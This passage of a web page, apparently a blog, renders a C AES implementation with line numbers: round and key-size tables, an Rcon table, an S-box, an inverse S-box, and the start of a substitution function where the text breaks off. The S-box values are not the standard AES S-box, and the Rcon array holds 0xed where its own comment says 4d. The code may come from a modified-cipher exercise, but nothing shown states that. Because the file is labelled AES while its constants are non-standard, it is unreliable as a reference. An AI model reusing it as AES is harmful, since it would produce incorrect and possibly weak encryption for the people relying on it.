class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">	AES_CYPHER_128,</span><br><span class="line">	AES_CYPHER_192,</span><br><span class="line">	AES_CYPHER_256,</span><br><span class="line">&#125; AES_CYPHER_T;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Encryption Rounds</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> g_aes_key_bits[] = &#123;</span><br><span class="line">	<span class="comment">/* AES_CYPHER_128 */</span> <span class="number">128</span>,</span><br><span class="line">	<span class="comment">/* AES_CYPHER_192 */</span> <span class="number">192</span>,</span><br><span class="line">	<span class="comment">/* AES_CYPHER_256 */</span> <span class="number">256</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> g_aes_rounds[] = &#123;</span><br><span class="line">	<span class="comment">/* AES_CYPHER_128 */</span>  <span class="number">10</span>,</span><br><span class="line">	<span class="comment">/* AES_CYPHER_192 */</span>  <span class="number">12</span>,</span><br><span class="line">	<span class="comment">/* AES_CYPHER_256 */</span>  <span class="number">14</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> g_aes_nk[] = &#123;</span><br><span class="line">	<span class="comment">/* AES_CYPHER_128 */</span>  <span class="number">4</span>,</span><br><span class="line">	<span class="comment">/* AES_CYPHER_192 */</span>  <span class="number">6</span>,</span><br><span class="line">	<span class="comment">/* AES_CYPHER_256 */</span>  <span class="number">8</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> g_aes_nb[] = &#123;</span><br><span class="line">	<span class="comment">/* AES_CYPHER_128 */</span>  <span class="number">4</span>,</span><br><span class="line">	<span class="comment">/* AES_CYPHER_192 */</span>  <span class="number">4</span>,</span><br><span class="line">	<span class="comment">/* AES_CYPHER_256 */</span>  <span class="number">4</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* aes Rcon:</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* WARNING: Rcon is designed starting from 1 to 15, not 0 to 14.</span></span><br><span class="line"><span class="comment">*          FIPS-197 Page 9: &quot;note that i starts at 1, not 0&quot;</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* i    |   0     1     2     3     4     5     6     7     8     9    10    11    12    13    14</span></span><br><span class="line"><span class="comment">* -----+------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">*      | [01]  [02]  [04]  [08]  [10]  [20]  [40]  [80]  [1b]  [36]  [6c]  [d8]  [ab]  [4d]  [9a]</span></span><br><span class="line"><span class="comment">* RCON | [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]</span></span><br><span class="line"><span class="comment">*      | [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]</span></span><br><span class="line"><span class="comment">*      | [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">uint32_t</span> g_aes_rcon[] = &#123;</span><br><span class="line">	<span class="number">0x01000000</span>, <span class="number">0x02000000</span>, <span class="number">0x04000000</span>, <span class="number">0x08000000</span>, <span class="number">0x10000000</span>, <span class="number">0x20000000</span>, <span class="number">0x40000000</span>, <span class="number">0x80000000</span>,</span><br><span class="line">	<span class="number">0x1b000000</span>, <span class="number">0x36000000</span>, <span class="number">0x6c000000</span>, <span class="number">0xd8000000</span>, <span class="number">0xab000000</span>, <span class="number">0xed000000</span>, <span class="number">0x9a000000</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* aes sbox and invert-sbox</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">uint8_t</span> g_aes_sbox[<span class="number">256</span>] = &#123;</span><br><span class="line">	<span class="comment">/* 0     1     2     3     4     5     6     7     8     9     A     B     C     D     E     F  */</span></span><br><span class="line">	<span class="number">0x77</span>,<span class="number">0x68</span>,<span class="number">0x63</span>,<span class="number">0x6f</span>,<span class="number">0xe6</span>,<span class="number">0x7f</span>,<span class="number">0x7b</span>,<span class="number">0xd1</span>,<span class="number">0x24</span>,<span class="number">0x15</span>,<span class="number">0x73</span>,<span class="number">0x3f</span>,<span class="number">0xea</span>,<span class="number">0xc3</span>,<span class="number">0xbf</span>,<span class="number">0x62</span>,<span class="number">0xde</span>,<span class="number">0x96</span>,<span class="number">0xdd</span>,<span class="number">0x69</span>,<span class="number">0xee</span>,<span class="number">0x4d</span>,<span class="number">0x53</span>,<span class="number">0xe4</span>,<span class="number">0xb9</span>,<span class="number">0xc0</span>,<span class="number">0xb6</span>,<span class="number">0xbb</span>,<span class="number">0x88</span>,<span class="number">0xb0</span>,<span class="number">0x66</span>,<span class="number">0xd4</span>,<span class="number">0xa3</span>,<span class="number">0xe9</span>,<span class="number">0x87</span>,<span class="number">0x32</span>,<span class="number">0x22</span>,<span class="number">0x2b</span>,<span class="number">0xe3</span>,<span class="number">0xd8</span>,<span class="number">0x20</span>,<span class="number">0xb1</span>,<span class="number">0xf1</span>,<span class="number">0xe5</span>,<span class="number">0x65</span>,<span class="number">0xcc</span>,<span class="number">0x25</span>,<span class="number">0x1</span>,<span class="number">0x10</span>,<span class="number">0xd3</span>,<span class="number">0x37</span>,</span><br><span class="line"><span class="number">0xd7</span>,<span class="number">0xc</span>,<span class="number">0x82</span>,<span class="number">0x11</span>,<span class="number">0x8e</span>,<span class="number">0x13</span>,<span class="number">0x6</span>,<span class="number">0x94</span>,<span class="number">0xf6</span>,<span class="number">0xff</span>,<span class="number">0x33</span>,<span class="number">0xa6</span>,<span class="number">0x61</span>,<span class="number">0x1d</span>,<span class="number">0x97</span>,<span class="number">0x38</span>,<span class="number">0xe</span>,<span class="number">0xf</span>,<span class="number">0x7a</span>,<span class="number">0x4e</span>,<span class="number">0xb4</span>,<span class="number">0x46</span>,<span class="number">0x2f</span>,<span class="number">0xc2</span>,<span class="number">0xa7</span>,<span class="number">0x3d</span>,<span class="number">0xf7</span>,<span class="number">0x3b</span>,<span class="number">0x90</span>,<span class="number">0x47</span>,<span class="number">0xc5</span>,<span class="number">0x14</span>,<span class="number">0xf9</span>,<span class="number">0x34</span>,<span class="number">0xe8</span>,<span class="number">0xa5</span></span><br><span class="line">,<span class="number">0x4f</span>,<span class="number">0x7e</span>,<span class="number">0xdf</span>,<span class="number">0xaa</span>,<span class="number">0x2d</span>,<span class="number">0x5e</span>,<span class="number">0x58</span>,<span class="number">0x4c</span>,<span class="number">0xdb</span>,<span class="number">0xc4</span>,<span class="number">0xfb</span>,<span class="number">0xbe</span>,<span class="number">0xef</span>,<span class="number">0x57</span>,<span class="number">0x59</span>,<span class="number">0x27</span>,<span class="number">0x91</span>,<span class="number">0x51</span>,<span class="number">0xed</span>,<span class="number">0x16</span>,<span class="number">0x6b</span>,<span class="number">0x44</span>,<span class="number">0x28</span>,<span class="number">0x8b</span>,<span class="number">0xbc</span>,<span class="number">0x45</span>,<span class="number">0xb7</span>,<span class="number">0x54</span>,<span class="number">0x9b</span>,<span class="number">0x86</span>,<span class="number">0x89</span>,<span class="number">0x2c</span>,<span class="number">0xe1</span>,<span class="number">0xa8</span>,<span class="number">0xa2</span>,<span class="number">0xce</span>,<span class="number">0x35</span>,<span class="number">0x4</span>,<span class="number">0xeb</span>,<span class="number">0xe7</span>,<span class="number">0xc6</span>,<span class="number">0xd9</span>,<span class="number">0x18</span>,<span class="number">0x7</span>,<span class="number">0xf8</span>,<span class="number">0x4b</span>,<span class="number">0x83</span>,<span class="number">0x50</span>,<span class="number">0x3</span>,<span class="number">0xd0</span>,<span class="number">0xb3</span>,<span class="number">0x6a</span>,<span class="number">0x29</span>,<span class="number">0x70</span>,<span class="number">0x49</span>,<span class="number">0xd</span>,<span class="number">0x67</span>,<span class="number">0x74</span>,<span class="number">0x95</span>,<span class="number">0x5b</span>,<span class="number">0xc8</span>,<span class="number">0x36</span>,<span class="number">0x3e</span>,<span class="number">0x84</span>,<span class="number">0x9c</span>,<span class="number">0x52</span>,<span class="number">0xfa</span>,<span class="number">0xac</span>,<span class="number">0x0</span>,<span class="number">0xca</span>,</span><br><span class="line"><span class="number">0x4a</span>,<span class="number">0x1f</span>,<span class="number">0xcf</span>,<span class="number">0xf4</span>,<span class="number">0x26</span>,<span class="number">0x2e</span>,<span class="number">0x1e</span>,<span class="number">0x5d</span>,<span class="number">0x12</span>,<span class="number">0x30</span>,<span class="number">0x48</span>,<span class="number">0xd6</span>,<span class="number">0xc7</span>,<span class="number">0xb8</span>,<span class="number">0x76</span>,<span class="number">0x85</span>,<span class="number">0x81</span>,<span class="number">0xf0</span>,<span class="number">0x6d</span>,<span class="number">0xf3</span>,<span class="number">0xdc</span>,<span class="number">0x23</span>,<span class="number">0x79</span>,<span class="number">0x99</span>,<span class="number">0xc1</span>,<span class="number">0x5a</span>,<span class="number">0xbd</span>,<span class="number">0x78</span>,<span class="number">0x42</span>,<span class="number">0xe0</span>,<span class="number">0xfe</span>,<span class="number">0x71</span>,<span class="number">0x6e</span>,<span class="number">0xba</span>,<span class="number">0x1c</span></span><br><span class="line">,<span class="number">0xae</span>,<span class="number">0x6c</span>,<span class="number">0x31</span>,<span class="number">0x3a</span>,<span class="number">0x8</span>,<span class="number">0xb2</span>,<span class="number">0xa0</span>,<span class="number">0xd2</span>,<span class="number">0xfc</span>,<span class="number">0xc9</span>,<span class="number">0x60</span>,<span class="number">0xb</span>,<span class="number">0x5f</span>,<span class="number">0xa9</span>,<span class="number">0x9f</span>,<span class="number">0x9e</span>,<span class="number">0x64</span>,<span class="number">0x2a</span></span><br><span class="line">,<span class="number">0xa1</span>,<span class="number">0x72</span>,<span class="number">0x5c</span>,<span class="number">0x17</span>,<span class="number">0xe2</span>,<span class="number">0x1a</span>,<span class="number">0x75</span>,<span class="number">0x21</span>,<span class="number">0x43</span>,<span class="number">0xad</span>,<span class="number">0x92</span>,<span class="number">0xd5</span>,<span class="number">0x9</span>,<span class="number">0x8a</span>,<span class="number">0xf5</span>,<span class="number">0xec</span>,<span class="number">0x8c</span>,<span class="number">0x5</span>,<span class="number">0x7d</span>,<span class="number">0xcd</span>,<span class="number">0x9a</span>,<span class="number">0x80</span>,<span class="number">0x8f</span>,<span class="number">0xa</span>,<span class="number">0x93</span>,<span class="number">0xfd</span>,<span class="number">0xda</span>,<span class="number">0x41</span>,<span class="number">0x3c</span>,<span class="number">0xcb</span>,<span class="number">0x98</span>,<span class="number">0xb5</span>,<span class="number">0x9d</span>,<span class="number">0x19</span>,<span class="number">0xab</span>,<span class="number">0xf2</span>,<span class="number">0x56</span>,<span class="number">0x7c</span>,<span class="number">0x55</span>,<span class="number">0x8d</span>,<span class="number">0x39</span>,<span class="number">0x1b</span>,<span class="number">0xa4</span>,<span class="number">0x40</span>,<span class="number">0xaf</span>,<span class="number">0x2</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">uint8_t</span> g_inv_sbox[<span class="number">256</span>] = &#123;</span><br><span class="line">	<span class="comment">/* 0     1     2     3     4     5     6     7     8     9     A     B     C     D     E     F  */</span></span><br><span class="line">	<span class="number">0x9B</span>,<span class="number">0x2F</span>,<span class="number">0xFF</span>,<span class="number">0x87</span>,<span class="number">0x7C</span>,<span class="number">0xE3</span>,<span class="number">0x39</span>,<span class="number">0x82</span>,<span class="number">0xC4</span>,<span class="number">0xDE</span>,<span class="number">0xE9</span>,<span class="number">0xCB</span>,<span class="number">0x34</span>,<span class="number">0x8E</span>,<span class="number">0x43</span>,<span class="number">0x44</span>,</span><br><span class="line"><span class="number">0x30</span>,<span class="number">0x36</span>,<span class="number">0xA5</span>,<span class="number">0x38</span>,<span class="number">0x52</span>,<span class="number">0x09</span>,<span class="number">0x6A</span>,<span class="number">0xD5</span>,<span class="number">0x81</span>,<span class="number">0xF3</span>,<span class="number">0xD7</span>,<span class="number">0xFB</span>,<span class="number">0xBF</span>,<span class="number">0x40</span>,<span class="number">0xA3</span>,<span class="number">0x9E</span>,<span class="number">0x28</span></span><br><span class="line">,<span class="number">0xD9</span>,<span class="number">0x24</span>,<span class="number">0xB2</span>,<span class="number">0x08</span>,<span class="number">0x2E</span>,<span class="number">0xA1</span>,<span class="number">0x66</span>,<span class="number">0x6D</span>,<span class="number">0x8B</span>,<span class="number">0xD1</span>,<span class="number">0x25</span>,<span class="number">0x76</span>,<span class="number">0x5B</span>,<span class="number">0xA2</span>,<span class="number">0x49</span>,<span class="number">0xA6</span>,<span class="number">0xC2</span>,<span class="number">0x23</span>,<span class="number">0x3D</span>,<span class="number">0x54</span>,<span class="number">0x7B</span>,<span class="number">0x94</span>,<span class="number">0x32</span>,<span class="number">0x42</span>,<span class="number">0xFA</span>,<span class="number">0xC3</span>,<span class="number">0x4E</span>,<span class="number">0xEE</span>,<span class="number">0x4C</span>,<span class="number">0x95</span>,<span class="number">0x0B</span>,<span class="number">0xFD</span>,<span class="number">0xED</span>,<span class="number">0xB9</span>,<span class="number">0xDA</span>,<span class="number">0x6C</span>,<span class="number">0x70</span>,<span class="number">0x48</span>,<span class="number">0x50</span>,<span class="number">0xA7</span>,<span class="number">0x8D</span>,<span class="number">0x9D</span>,<span class="number">0x84</span>,<span class="number">0x5E</span>,<span class="number">0x15</span>,<span class="number">0x46</span>,<span class="number">0x57</span>,<span class="number">0x86</span>,<span class="number">0x68</span>,<span class="number">0x98</span>,<span class="number">0x16</span>,<span class="number">0x72</span>,<span class="number">0xF8</span>,<span class="number">0xF6</span>,<span class="number">0x64</span>,<span class="number">0x5D</span>,<span class="number">0x65</span>,<span class="number">0xB6</span>,<span class="number">0x92</span>,<span class="number">0xD4</span>,<span class="number">0xA4</span>,<span class="number">0x5C</span>,<span class="number">0xCC</span>,<span class="number">0xCA</span>,<span class="number">0x3F</span>,<span class="number">0x0F</span>,<span class="number">0x02</span>,<span class="number">0xD0</span>,<span class="number">0x2C</span>,<span class="number">0x1E</span>,<span class="number">0x8F</span>,<span class="number">0x01</span>,<span class="number">0x13</span>,<span class="number">0x8A</span>,<span class="number">0x6B</span>,<span class="number">0xC1</span>,<span class="number">0xAF</span>,<span class="number">0xBD</span>,<span class="number">0x03</span>,<span class="number">0x8C</span>,<span class="number">0xBC</span>,<span class="number">0xD3</span>,<span class="number">0x0A</span>,<span class="number">0x90</span>,<span class="number">0xD8</span>,<span class="number">0xAB</span>,<span class="number">0x00</span>,<span class="number">0xB8</span>,<span class="number">0xB3</span>,<span class="number">0x45</span>,<span class="number">0x06</span>,<span class="number">0xF7</span>,<span class="number">0xE4</span>,<span class="number">0x58</span>,<span class="number">0x05</span>,<span class="number">0xE7</span>,<span class="number">0xAD</span>,<span class="number">0x35</span>,<span class="number">0x85</span>,<span class="number">0x96</span>,</span><br><span class="line"><span class="number">0xAC</span>,<span class="number">0x74</span>,<span class="number">0x22</span>,<span class="number">0x1C</span>,<span class="number">0x75</span>,<span class="number">0xDF</span>,<span class="number">0x6E</span>,<span class="number">0xE2</span>,<span class="number">0xF9</span>,<span class="number">0x37</span>,<span class="number">0xE8</span>,<span class="number">0x4F</span>,<span class="number">0x67</span>,<span class="number">0xDC</span>,<span class="number">0xEA</span>,<span class="number">0x3A</span>,<span class="number">0x91</span>,<span class="number">0x11</span>,<span class="number">0x41</span>,<span class="number">0xF0</span>,<span class="number">0xB4</span>,<span class="number">0xE6</span>,<span class="number">0x73</span>,<span class="number">0x97</span>,<span class="number">0xF2</span>,<span class="number">0xCF</span>,<span class="number">0xCE</span>,<span class="number">0xC6</span>,<span class="number">0xD2</span>,<span class="number">0x79</span>,<span class="number">0x20</span>,<span class="number">0xFC</span>,<span class="number">0x56</span>,<span class="number">0x3E</span>,<span class="number">0x4B</span>,<span class="number">0x78</span>,<span class="number">0xCD</span>,<span class="number">0x5A</span>,<span class="number">0xF4</span>,<span class="number">0x9A</span>,<span class="number">0xDB</span>,<span class="number">0xC0</span>,<span class="number">0xFE</span>,<span class="number">0x1D</span>,<span class="number">0x29</span>,<span class="number">0xC5</span>,<span class="number">0x89</span>,<span class="number">0x47</span>,<span class="number">0xF1</span>,<span class="number">0x1A</span>,<span class="number">0x71</span>,<span class="number">0xAA</span>,<span class="number">0x18</span>,<span class="number">0xBE</span>,<span class="number">0x1B</span>,<span class="number">0x6F</span>,<span class="number">0xB7</span>,<span class="number">0x62</span>,<span class="number">0x0E</span>,<span class="number">0x19</span>,<span class="number">0xB5</span>,<span class="number">0x4A</span>,<span class="number">0x0D</span>,<span class="number">0x60</span>,<span class="number">0x51</span>,<span class="number">0x7F</span>,<span class="number">0xA9</span>,</span><br><span class="line"><span class="number">0x93</span>,<span class="number">0xC9</span>,<span class="number">0x9C</span>,<span class="number">0xEF</span>,<span class="number">0x2D</span>,<span class="number">0xE5</span>,<span class="number">0x7A</span>,<span class="number">0x9F</span>,<span class="number">0x88</span>,<span class="number">0x07</span>,<span class="number">0xC7</span>,<span class="number">0x31</span>,<span class="number">0x1F</span>,<span class="number">0xDD</span>,<span class="number">0xA8</span>,<span class="number">0x33</span>,<span class="number">0x27</span>,<span class="number">0x80</span>,<span class="number">0xEC</span>,<span class="number">0x5F</span>,<span class="number">0xB1</span>,<span class="number">0x12</span>,<span class="number">0x10</span>,<span class="number">0x59</span>,<span class="number">0xBA</span>,<span class="number">0x77</span>,<span class="number">0xD6</span>,<span class="number">0x26</span>,<span class="number">0x17</span>,<span class="number">0x2B</span>,<span class="number">0x04</span>,<span class="number">0x7E</span>,<span class="number">0x55</span>,<span class="number">0x21</span>,<span class="number">0x0C</span>,<span class="number">0x7D</span>,<span class="number">0xE1</span>,<span class="number">0x69</span>,<span class="number">0x14</span>,<span class="number">0x63</span>,<span class="number">0xAE</span>,<span class="number">0x2A</span>,<span class="number">0xF5</span>,<span class="number">0xB0</span>,<span class="number">0xA0</span>,<span class="number">0xE0</span>,<span class="number">0x3B</span>,<span class="number">0x4D</span>,<span class="number">0x83</span>,<span class="number">0x53</span>,<span class="number">0x99</span>,<span class="number">0x61</span>,<span class="number">0xC8</span>,<span class="number">0xEB</span>,<span class="number">0xBB</span>,<span class="number">0x3C</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="type">uint8_t</span> <span class="title function_">aes_sub_sbox</span><span class="params">(<span class="type">uint8_t</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> g_aes_sbox[val];</span><br><span class="line">&#125;</span><br><span class="line"><span 